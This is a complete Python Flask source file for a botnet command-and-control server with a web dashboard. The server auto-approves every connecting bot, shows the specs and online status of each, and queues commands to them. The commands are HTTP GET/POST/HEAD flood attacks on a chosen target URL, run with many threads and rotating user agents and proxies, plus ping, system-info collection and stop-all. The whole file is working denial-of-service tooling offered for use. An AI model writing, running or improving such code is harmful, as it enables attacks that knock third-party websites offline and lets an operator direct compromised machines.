"""
FIXED C2 SERVER - Enhanced Dashboard Updates
=============================================
Fixed issues with dashboard not showing connected bots
"""

import threading
import json
import time
import os
from datetime import datetime

try:
    from flask import Flask, render_template_string, request, jsonify
    from flask_cors import CORS
except ImportError:
    print("[!] Install dependencies: pip install flask flask-cors")
    exit(1)

app = Flask(__name__)
CORS(app)

# Global storage
approved_bots = {}
commands_queue = {}
attack_logs = []
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]
proxy_list = []

# FIXED DASHBOARD HTML with better error handling
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>C2 Control Panel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #000000 0%, #0a1929 100%);
            color: #e3f2fd;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            text-align: center;
            border: 2px solid #1976d2;
            padding: 25px;
            margin-bottom: 25px;
            background: rgba(13, 27, 42, 0.9);
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(25, 118, 210, 0.2);
        }
        .header h1 { 
            font-size: 2.2em; 
            margin-bottom: 10px; 
            color: #42a5f5;
            text-shadow: 0 0 20px rgba(66, 165, 245, 0.5);
        }
        .header p { color: #90caf9; }
        .debug-info {
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff5252;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        .stat-box {
            border: 2px solid #1976d2;
            padding: 20px;
            background: rgba(13, 27, 42, 0.9);
            text-align: center;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(25, 118, 210, 0.15);
            transition: all 0.3s ease;
        }
        .stat-box:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 24px rgba(25, 118, 210, 0.3);
        }
        .stat-box h3 { color: #42a5f5; margin-bottom: 10px; font-size: 0.9em; }
        .stat-box p { font-size: 2.2em; color: #90caf9; font-weight: bold; }
        .section {
            border: 2px solid #1976d2;
            padding: 25px;
            margin-bottom: 25px;
            background: rgba(13, 27, 42, 0.9);
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(25, 118, 210, 0.15);
        }
        .section h2 {
            color: #42a5f5;
            margin-bottom: 20px;
            border-bottom: 2px solid #1976d2;
            padding-bottom: 12px;
            font-size: 1.3em;
        }
        .bot-list { display: grid; gap: 12px; }
        .bot-item {
            border: 1px solid #1976d2;
            padding: 15px;
            background: rgba(13, 27, 42, 0.6);
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        .bot-item:hover {
            background: rgba(25, 118, 210, 0.15);
            transform: translateX(5px);
        }
        .bot-item.offline { border-color: #546e7a; color: #90a4ae; }
        .btn {
            background: #1976d2;
            color: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: inherit;
            font-weight: 600;
            margin-left: 10px;
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        .btn:hover { 
            background: #1565c0;
            transform: scale(1.05);
        }
        .btn-danger { background: #d32f2f; }
        .btn-danger:hover { background: #c62828; }
        input, select, textarea, button {
            background: rgba(13, 27, 42, 0.8);
            border: 2px solid #1976d2;
            color: #e3f2fd;
            padding: 12px;
            font-family: inherit;
            width: 100%;
            margin: 8px 0;
            border-radius: 6px;
        }
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #42a5f5;
        }
        button { cursor: pointer; font-weight: 600; }
        .form-group { margin-bottom: 18px; }
        .form-group label { 
            display: block; 
            margin-bottom: 8px;
            color: #90caf9;
            font-weight: 500;
        }
        textarea { min-height: 120px; font-size: 13px; }
        .log {
            max-height: 300px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.5);
            padding: 15px;
            border: 1px solid #1976d2;
            border-radius: 6px;
        }
        .log-entry { 
            margin-bottom: 8px;
            padding: 6px;
            border-left: 3px solid #1976d2;
            padding-left: 10px;
        }
        .success { color: #66bb6a; border-left-color: #66bb6a; }
        .error { color: #ef5350; border-left-color: #ef5350; }
        .warning { color: #ffa726; border-left-color: #ffa726; }
        .info { color: #42a5f5; border-left-color: #42a5f5; }
    </style>
</head>
<body>
    <div class="header">
        <h1>C2 CONTROL PANEL</h1>
        <p>Auto-Approval System | Resource Optimized</p>
    </div>

    <div class="debug-info" id="debug-info">
        [DEBUG] Initializing... Last update: Never
    </div>

    <div class="stats">
        <div class="stat-box">
            <h3>ACTIVE BOTS</h3>
            <p id="approved-bots">0</p>
        </div>
        <div class="stat-box">
            <h3>ONLINE BOTS</h3>
            <p id="online-bots">0</p>
        </div>
        <div class="stat-box">
            <h3>ACTIVE ATTACKS</h3>
            <p id="active-attacks">0</p>
        </div>
        <div class="stat-box">
            <h3>USER AGENTS</h3>
            <p id="user-agents-count">0</p>
        </div>
    </div>

    <div class="section">
        <h2>CONNECTED BOTS</h2>
        <div id="approved-list" class="bot-list">
            <div style="text-align:center;color:#546e7a;">Loading...</div>
        </div>
    </div>

    <div class="section">
        <h2>USER AGENT MANAGEMENT</h2>
        <div class="form-group">
            <label>User Agents (one per line):</label>
            <textarea id="user-agents" placeholder="Mozilla/5.0 ..."></textarea>
        </div>
        <button onclick="updateUserAgents()">UPDATE USER AGENTS</button>
    </div>

    <div class="section">
        <h2>HTTP FLOOD ATTACK</h2>
        <div class="form-group">
            <label>Target URL:</label>
            <input type="text" id="http-target" placeholder="https://example.com">
        </div>
        <div class="form-group">
            <label>Threads per Bot (50-300):</label>
            <input type="number" id="http-threads" value="100" min="50" max="300">
        </div>
        <div class="form-group">
            <label>Duration (seconds):</label>
            <input type="number" id="http-duration" value="60">
        </div>
        <div class="form-group">
            <label>Method:</label>
            <select id="http-method">
                <option value="GET">GET</option>
                <option value="POST">POST</option>
                <option value="HEAD">HEAD</option>
            </select>
        </div>
        <button onclick="launchHTTPFlood()">LAUNCH HTTP FLOOD</button>
    </div>

    <div class="section">
        <h2>BOT COMMANDS</h2>
        <button onclick="sendPing()">PING ALL BOTS</button>
        <button onclick="sendSysInfo()">GET SYSTEM INFO</button>
        <button onclick="stopAllAttacks()">STOP ALL ATTACKS</button>
    </div>

    <div class="section">
        <h2>ACTIVITY LOGS</h2>
        <div id="logs" class="log"></div>
    </div>

    <script>
        let updateCount = 0;
        let lastData = null;

        function updateDebugInfo(message) {
            const now = new Date().toLocaleTimeString();
            document.getElementById('debug-info').innerHTML = 
                `[DEBUG] ${message} | Update #${updateCount} | Time: ${now}`;
        }

        function updateStats() {
            updateCount++;
            updateDebugInfo('Fetching stats...');
            
            fetch('/api/stats')
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`HTTP ${response.status}`);
                    }
                    return response.json();
                })
                .then(data => {
                    lastData = data;
                    updateDebugInfo(`SUCCESS! Got ${data.approved_bots} bots | ${data.online_bots} online`);
                    
                    // Update stats
                    document.getElementById('approved-bots').textContent = data.approved_bots || 0;
                    document.getElementById('online-bots').textContent = data.online_bots || 0;
                    document.getElementById('active-attacks').textContent = data.active_attacks || 0;
                    document.getElementById('user-agents-count').textContent = data.user_agents_count || 0;
                    
                    // Update user agents textarea
                    document.getElementById('user-agents').value = (data.user_agents || []).join('\n');
                    
                    // Update bot list
                    const approvedList = document.getElementById('approved-list');
                    approvedList.innerHTML = '';
                    
                    if(!data.approved || data.approved.length === 0) {
                        approvedList.innerHTML = '<div style="text-align:center;color:#546e7a;">No bots connected yet</div>';
                    } else {
                        data.approved.forEach(bot => {
                            const div = document.createElement('div');
                            div.className = 'bot-item' + (bot.online ? '' : ' offline');
                            div.innerHTML = `
                                <div>
                                    <strong style="color:#42a5f5;">[${bot.bot_id}]</strong> - 
                                    ${bot.specs.cpu_cores} cores, ${bot.specs.ram_gb}GB RAM - 
                                    <span style="color:${bot.online ? '#66bb6a' : '#ef5350'}">
                                        ${bot.online ? 'ONLINE' : 'OFFLINE'}
                                    </span> - 
                                    Status: ${bot.status || 'idle'} - 
                                    Last seen: ${bot.last_seen}
                                </div>
                                <button class="btn btn-danger" onclick="removeBot('${bot.bot_id}')">REMOVE</button>
                            `;
                            approvedList.appendChild(div);
                        });
                    }
                    
                    // Update logs
                    const logsDiv = document.getElementById('logs');
                    const logs = data.logs || [];
                    logsDiv.innerHTML = logs.slice(-30).reverse().map(log => 
                        `<div class="log-entry ${log.type}">[${log.time}] ${log.message}</div>`
                    ).join('');
                })
                .catch(error => {
                    updateDebugInfo(`ERROR: ${error.message}`);
                    console.error('Stats fetch error:', error);
                });
        }

        function removeBot(botId) {
            if(confirm('Remove bot: ' + botId + '?')) {
                fetch('/api/remove/' + botId, {method: 'POST'})
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    })
                    .catch(error => alert('Error: ' + error.message));
            }
        }

        function updateUserAgents() {
            const agents = document.getElementById('user-agents').value;
            fetch('/api/user-agents', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ user_agents: agents })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            })
            .catch(error => alert('Error: ' + error.message));
        }

        function launchHTTPFlood() {
            const target = document.getElementById('http-target').value;
            const duration = document.getElementById('http-duration').value;
            const threads = document.getElementById('http-threads').value;
            const method = document.getElementById('http-method').value;
            
            if (!target) {
                alert('Please enter target URL');
                return;
            }
            
            fetch('/api/attack/http', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ target, duration, threads, method })
            })
            .then(r => r.json())
            .then(data => {
                alert(data.message);
                updateStats();
            })
            .catch(error => alert('Error: ' + error.message));
        }

        function sendPing() {
            fetch('/api/command/ping', { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                })
                .catch(error => alert('Error: ' + error.message));
        }

        function sendSysInfo() {
            fetch('/api/command/sysinfo', { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                })
                .catch(error => alert('Error: ' + error.message));
        }

        function stopAllAttacks() {
            if(confirm('Stop all active attacks on all bots?')) {
                fetch('/api/command/stop', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => {
                        alert(data.message);
                        updateStats();
                    })
                    .catch(error => alert('Error: ' + error.message));
            }
        }

        // Update every 2 seconds
        setInterval(updateStats, 2000);
        
        // Initial update
        updateStats();
        
        console.log('[C2] Dashboard loaded and auto-update started');
    </script>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/check_approval', methods=['POST'])
def check_approval():
    data = request.json
    bot_id = data['bot_id']
    specs = data['specs']
    
    # Auto-approve all bots
    if bot_id not in approved_bots:
        approved_bots[bot_id] = {
            'specs': specs,
            'last_seen': time.time(),
            'status': 'approved',
            'approved_at': time.time()
        }
        attack_logs.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': 'success',
            'message': f'Bot auto-approved: {bot_id}'
        })
        print(f"[+] Bot auto-approved: {bot_id}")
    
    approved_bots[bot_id]['last_seen'] = time.time()
    return jsonify({'approved': True})

@app.route('/commands/<bot_id>', methods=['GET'])
def get_commands(bot_id):
    if bot_id in approved_bots:
        approved_bots[bot_id]['last_seen'] = time.time()
    
    commands = commands_queue.get(bot_id, [])
    commands_queue[bot_id] = []
    
    return jsonify({'commands': commands})

@app.route('/status', methods=['POST'])
def receive_status():
    data = request.json
    bot_id = data['bot_id']
    
    if bot_id in approved_bots:
        approved_bots[bot_id]['status'] = data['status']
        approved_bots[bot_id]['last_seen'] = time.time()
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': data['status'],
        'message': f"{bot_id}: {data['message']}"
    })
    
    return jsonify({'status': 'ok'})

@app.route('/api/user-agents', methods=['GET', 'POST'])
def manage_user_agents():
    global user_agents
    
    if request.method == 'POST':
        data = request.json
        agents_text = data.get('user_agents', '')
        new_agents = [line.strip() for line in agents_text.split('\n') if line.strip()]
        
        if new_agents:
            user_agents = new_agents
            attack_logs.append({
                'time': datetime.now().strftime('%H:%M:%S'),
                'type': 'info',
                'message': f'Updated {len(user_agents)} user agents'
            })
            return jsonify({'status': 'success', 'message': f'Updated {len(user_agents)} user agents'})
        
        return jsonify({'status': 'error', 'message': 'No valid user agents provided'}), 400
    
    return jsonify({'user_agents': user_agents})

@app.route('/api/remove/<bot_id>', methods=['POST'])
def remove_bot(bot_id):
    if bot_id in approved_bots:
        del approved_bots[bot_id]
        if bot_id in commands_queue:
            del commands_queue[bot_id]
        
        attack_logs.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'type': 'error',
            'message': f'Bot removed: {bot_id}'
        })
        
        print(f"[-] Bot removed: {bot_id}")
        return jsonify({'status': 'success', 'message': f'Bot {bot_id} removed'})
    
    return jsonify({'status': 'error', 'message': 'Bot not found'}), 404

@app.route('/api/stats', methods=['GET'])
def get_stats():
    current_time = time.time()
    online_bots = sum(1 for bot in approved_bots.values() if current_time - bot['last_seen'] < 30)
    active_attacks = sum(1 for bot in approved_bots.values() if bot.get('status') == 'running')
    
    approved_list = []
    for bot_id, info in approved_bots.items():
        approved_list.append({
            'bot_id': bot_id,
            'specs': info['specs'],
            'status': info.get('status', 'idle'),
            'last_seen': time.strftime('%H:%M:%S', time.localtime(info['last_seen'])),
            'online': current_time - info['last_seen'] < 30
        })
    
    return jsonify({
        'approved_bots': len(approved_bots),
        'online_bots': online_bots,
        'active_attacks': active_attacks,
        'user_agents_count': len(user_agents),
        'approved': approved_list,
        'logs': attack_logs[-50:],
        'user_agents': user_agents,
        'proxies': proxy_list
    })

@app.route('/api/attack/http', methods=['POST'])
def launch_http_attack():
    data = request.json
    
    sent_count = 0
    current_time = time.time()
    
    for bot_id, info in approved_bots.items():
        if current_time - info['last_seen'] < 30:
            command = {
                'type': 'http_flood',
                'target': data['target'],
                'duration': int(data['duration']),
                'threads': int(data['threads']),
                'method': data.get('method', 'GET'),
                'user_agents': user_agents,
                'proxies': proxy_list
            }
            
            if bot_id not in commands_queue:
                commands_queue[bot_id] = []
            commands_queue[bot_id].append(command)
            sent_count += 1
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': 'warning',
        'message': f'HTTP {data.get("method", "GET")} flood to {sent_count} bots -> {data["target"]}'
    })
    
    return jsonify({'status': 'success', 'message': f'HTTP flood sent to {sent_count} bots'})

@app.route('/api/command/ping', methods=['POST'])
def send_ping():
    sent_count = 0
    current_time = time.time()
    
    for bot_id, info in approved_bots.items():
        if current_time - info['last_seen'] < 30:
            command = {'type': 'ping'}
            
            if bot_id not in commands_queue:
                commands_queue[bot_id] = []
            commands_queue[bot_id].append(command)
            sent_count += 1
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': 'success',
        'message': f'Ping sent to {sent_count} bots'
    })
    
    return jsonify({'status': 'success', 'message': f'Ping sent to {sent_count} bots'})

@app.route('/api/command/sysinfo', methods=['POST'])
def send_sysinfo():
    sent_count = 0
    current_time = time.time()
    
    for bot_id, info in approved_bots.items():
        if current_time - info['last_seen'] < 30:
            command = {'type': 'sysinfo'}
            
            if bot_id not in commands_queue:
                commands_queue[bot_id] = []
            commands_queue[bot_id].append(command)
            sent_count += 1
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': 'success',
        'message': f'Sysinfo request sent to {sent_count} bots'
    })
    
    return jsonify({'status': 'success', 'message': f'Sysinfo sent to {sent_count} bots'})

@app.route('/api/command/stop', methods=['POST'])
def send_stop_all():
    sent_count = 0
    current_time = time.time()
    
    for bot_id, info in approved_bots.items():
        if current_time - info['last_seen'] < 30:
            command = {'type': 'stop_all'}
            
            if bot_id not in commands_queue:
                commands_queue[bot_id] = []
            commands_queue[bot_id].append(command)
            sent_count += 1
    
    attack_logs.append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'type': 'error',
        'message': f'Stop all attacks command sent to {sent_count} bots'
    })
    
    return jsonify({'status': 'success', 'message': f'Stop command sent to {sent_count} bots'})

if __name__ == '__main__':
    import sys
    
    print("\n" + "="*60)
    print("  FIXED C2 SERVER - ENHANCED DASHBOARD")
    print("="*60)
    
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
    port = int(os.environ.get('PORT', port))
    
    print(f"[+] Starting server on port {port}")
    print(f"[+] Dashboard: http://localhost:{port}")
    print(f"[+] All bots will be auto-approved")
    print(f"[+] Dashboard has debug info enabled")
    print(f"[+] Waiting for connections...\n")
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
